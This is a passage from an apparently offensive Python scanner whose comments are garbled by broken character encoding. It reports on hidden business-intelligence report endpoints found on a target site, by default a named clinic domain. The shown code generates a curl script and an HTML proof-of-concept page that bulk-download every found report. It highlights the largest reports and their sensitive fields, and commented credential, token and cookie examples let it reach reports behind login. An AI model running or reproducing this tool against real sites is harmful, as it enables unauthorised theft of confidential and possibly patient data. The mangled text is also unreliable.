        """ç”ŸæˆæŠ¥å‘Š"""
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        
        report = {
            'target': self.target_url,
            'scan_time': datetime.now().isoformat(),
            'bi_systems': self.bi_systems,
            'found_reports': len(self.found_reports),
            'export_endpoints': len(self.export_endpoints),
            'reports': self.found_reports,
            'extracted_data': self.extracted_data
        }
        
        # ä¿å­˜JSONæŠ¥å‘Š
        report_file = f"hidden_report_finder_{timestamp}.json"
        with open(report_file, 'w', encoding='utf-8') as f:
            json.dump(report, f, ensure_ascii=False, indent=2)
            
        # ç”Ÿæˆåˆ©ç”¨è„šæœ¬
        if self.found_reports:
            script_file = f"report_downloader_{timestamp}.sh"
            with open(script_file, 'w') as f:
                f.write("#!/bin/bash\n")
                f.write(f"# æŠ¥è¡¨ä¸‹è½½è„šæœ¬\n")
                f.write(f"# ç›®æ ‡: {self.target_url}\n")
                f.write(f"# æ—¶é—´: {datetime.now()}\n\n")
                
                f.write("# åˆ›å»ºä¸‹è½½ç›®å½•\n")
                f.write("mkdir -p reports_download\n\n")
                
                # ä¸‹è½½å‘½ä»¤
                for i, report in enumerate(self.found_reports):
                    url = report.get('url', report['endpoint'])
                    
                    # æ ¹æ®ç±»å‹ç¡®å®šæ–‡ä»¶æ‰©å±•å
                    content_type = report.get('content_type', '')
                    if 'json' in content_type:
                        ext = '.json'
                    elif 'csv' in content_type:
                        ext = '.csv'
                    elif 'excel' in content_type or 'spreadsheet' in content_type:
                        ext = '.xlsx'
                    elif 'xml' in content_type:
                        ext = '.xml'
                    else:
                        ext = ''
                        
                    f.write(f"# æŠ¥è¡¨ {i+1}\n")
                    f.write(f"echo 'ä¸‹è½½æŠ¥è¡¨ {i+1}...'\n")
                    f.write(f"curl -o 'reports_download/report_{i+1}{ext}' '{url}'\n\n")
                    
                f.write("echo 'ä¸‹è½½å®Œæˆ!'\n")
                f.write("ls -la reports_download/\n")
                
            import os
            os.chmod(script_file, 0o755)
            
        # ç”ŸæˆPOC HTML
        if self.found_reports:
            poc_file = f"report_poc_{timestamp}.html"
            with open(poc_file, 'w') as f:
                f.write("""<!DOCTYPE html>
<html>
<head>
    <title>æŠ¥è¡¨POC</title>
    <meta charset="utf-8">
    <style>
        body { font-family: Arial; margin: 20px; }
        .report { margin: 20px 0; padding: 10px; border: 1px solid #ccc; }
        button { margin: 5px; padding: 10px; }
    </style>
</head>
<body>
    <h1>éšè—æŠ¥è¡¨åŠŸèƒ½POC</h1>
    <p>ç›®æ ‡: """ + self.target_url + """</p>
    
    <h2>å‘ç°çš„æŠ¥è¡¨:</h2>
""")
                
                for i, report in enumerate(self.found_reports):
                    url = report.get('url', report['endpoint'])
                    f.write(f"""
    <div class="report">
        <h3>æŠ¥è¡¨ {i+1}</h3>
        <p>URL: {url}</p>
        <p>ç±»å‹: {report.get('content_type', 'unknown')}</p>
        <p>å¤§å°: {self.format_size(report.get('size', 0))}</p>
        <button onclick="window.open('{url}')">åœ¨æ–°çª—å£æ‰“å¼€</button>
        <button onclick="downloadReport('{url}', 'report_{i+1}')">ä¸‹è½½</button>
    </div>
""")
                    
                f.write("""
    <script>
    function downloadReport(url, filename) {
        fetch(url)
            .then(resp => resp.blob())
            .then(blob => {
                const a = document.createElement('a');
                a.href = URL.createObjectURL(blob);
                a.download = filename;
                a.click();
            });
    }
    </script>
</body>
</html>""")
                
            print(f"[+] POCé¡µé¢: {poc_file}")
            
        print(f"\n[+] éšè—æŠ¥è¡¨å‘ç°å®Œæˆ!")
        print(f"[+] BIç³»ç»Ÿ: {len(self.bi_systems)}")
        print(f"[+] æŠ¥è¡¨ç«¯ç‚¹: {len(self.export_endpoints)}")
        print(f"[+] å¯ç”¨æŠ¥è¡¨: {len(self.found_reports)}")
        print(f"[+] æŠ¥å‘Šæ–‡ä»¶: {report_file}")
        
        if self.found_reports:
            print(f"[+] ä¸‹è½½è„šæœ¬: {script_file}")
            
            # æ‰“å°æœ€æœ‰ä»·å€¼çš„å‘ç°
            print("\n[!] æœ€æœ‰ä»·å€¼çš„å‘ç°:")
            
            # æŒ‰å¤§å°æ’åº
            sorted_reports = sorted(self.found_reports, key=lambda x: x.get('size', 0), reverse=True)
            
            for report in sorted_reports[:5]:
                print(f"    {report.get('endpoint', report.get('url'))}")
                print(f"      å¤§å°: {self.format_size(report.get('size', 0))}")
                
                if 'analysis' in report:
                    analysis = report['analysis']
                    print(f"      è®°å½•æ•°: {analysis.get('record_count', 'unknown')}")
                    if 'sensitive_fields' in analysis:
                        print(f"      æ•æ„Ÿå­—æ®µ: {', '.join(analysis['sensitive_fields'])}")

async def main():
    import sys
    
    if len(sys.argv) > 1:
        target = sys.argv[1]
    else:
        target = input("ç›®æ ‡URL [https://asanoha-clinic.com]: ").strip()
        if not target:
            target = "https://asanoha-clinic.com"
    
    # è®¤è¯é…ç½®ç¤ºä¾‹ï¼ˆå¯æ ¹æ®éœ€è¦ä¿®æ”¹ï¼‰
    auth_config = None
    
    # ç¤ºä¾‹1: ç”¨æˆ·åå¯†ç ç™»å½•
    # auth_config = {
    #     'login_url': f'{target}/login',
    #     'username': 'admin',
    #     'password': 'password123',
    #     'heartbeat_endpoint': '/api/profile'
    # }
    
    # ç¤ºä¾‹2: ç›´æ¥ä½¿ç”¨JWT token
    # auth_config = {
    #     'jwt_token': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...'
    # }
    
    # ç¤ºä¾‹3: ä½¿ç”¨ç°æœ‰Cookies
    # auth_config = {
    #     'cookies': {
    #         'session_id': 'abc123def456',
    #         'csrf_token': 'xyz789'
    #     }
    # }
    
    print(f"ç›®æ ‡ å¯åŠ¨éšè—æŠ¥è¡¨å‘ç°å™¨")
    print(f"ç›®æ ‡ ç›®æ ‡: {target}")
    print(f"è®¤è¯ è®¤è¯æ¨¡å¼: {'å¯ç”¨' if auth_config else 'ç¦ç”¨'}")
    
    if auth_config:
        print("  å¯ç”¨è®¤è¯æ¨¡å¼ - å¯è®¿é—®è®¤è¯åæŠ¥è¡¨é‡‘çŸ¿ï¼")
    else:
        print("  æ— è®¤è¯æ¨¡å¼ - ä»…è®¿é—®å…¬å¼€æŠ¥è¡¨")
        print("   æç¤º: ä¿®æ”¹mainå‡½æ•°ä¸­çš„auth_configæ¥å¯ç”¨è®¤è¯")
    
    finder = HiddenReportFinder(target, auth_config=auth_config)
    results = await finder.run()
    
    print(f"\n  æ‰«æå®Œæˆï¼")
    print(f"  å‘ç°æŠ¥è¡¨: {len(results)}")
    
    if auth_config and finder.auth_manager:
        auth_stats = finder.auth_manager.get_auth_stats()
        print(f"è®¤è¯ è®¤è¯è¯·æ±‚: {auth_stats.get('authenticated_requests', 0)}")
        print(f"è®¤è¯ è®¤è¯å¤±è´¥: {auth_stats.get('auth_failures', 0)}")
        print(f"è®¤è¯ ä¼šè¯æ¢å¤: {auth_stats.get('session_recoveries', 0)}")
    
    return results

if __name__ == "__main__":
    asyncio.run(main())